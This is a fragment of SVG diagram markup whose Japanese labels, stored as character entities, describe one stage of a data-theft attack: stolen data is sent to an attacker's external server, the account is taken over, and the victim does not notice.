    <text x="56" y="288" fill="#f8fafc" font-size="11.5" font-weight="600">&#25915;&#25731;&#32773;&#12398;&#12469;&#12540;&#12496;&#12540;&#12395;&#36865;&#20449;</text>
    <text x="56" y="304" fill="#94a3b8" font-size="9.5">&#31397;&#21462;&#12375;&#12383;&#12487;&#12540;&#12479;&#12434;&#22806;&#37096;&#12469;&#12540;&#12496;&#12540;</text>
    <text x="56" y="317" fill="#94a3b8" font-size="9.5">&#12408;&#36865;&#20449;&#12375;&#12289;&#12450;&#12459;&#12454;&#12531;&#12488;&#20055;&#21462;&#12426;</text>
    <text x="56" y="343" fill="#64748b" font-size="8.5">&#8251; &#34987;&#23475;&#32773;&#12399;&#12487;&#12540;&#12479;&#31397;&#21462;&#12395;&#27671;&#12389;&#12363;&#12394;&#12356;</text>
